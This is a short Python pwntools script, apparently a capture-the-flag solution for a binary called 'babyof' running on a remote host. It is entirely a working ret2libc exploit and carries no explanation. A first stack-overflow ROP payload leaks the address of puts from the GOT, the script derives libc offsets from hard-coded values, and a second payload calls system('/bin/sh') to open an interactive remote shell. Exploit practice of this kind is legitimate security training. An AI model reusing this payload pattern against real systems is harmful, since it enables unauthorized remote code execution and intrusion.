import imp
from pwn import *
from LibcSearcher import *
#p=process('babyof')
p=remote('1.14.71.254',28192)
elf=ELF('./babyof')
libc=ELF("./libc-2.27-x64(18).so")

main_addr=0x40066B
#main_addr=elf.sym['main']
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']

ret=0x0000000000400506

rdi=0x0000000000400743
rsi=0x0000000000400741
rsp=0x000000000040073d

payload=b'a'*(0x40+0x8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.sendline(payload)
    
puts_addr = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
#puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
print(hex(puts_addr))
#pause()
#offset=puts_addr-libc.symbols['puts']
#system=offset+libc.symbols['system']
#binsh=offset+libc.search(b'/bin/sh').__next__()
print(hex(libc.symbols['puts']))
offset = puts_addr - 0x80aa0
#system = libc_base + libc.sym['system']
system = offset + 0x4f550
#info(hex(system))
#binsh = libc_base  + next(libc.search(b'/bin/sh\x00'))
binsh = offset + 0x1b3e1a

#libc = LibcSearcher('puts',puts_addr)
#libc_base = puts_addr - libc.dump('puts')
#system = libc_base + libc.dump('system')
#binsh = libc_base + libc.dump('str_bin_sh')




payload2 = b'a'*0x48 +p64(ret)+p64(rdi)+p64(binsh)+p64(system)
p.sendline(payload2)
p.interactive()
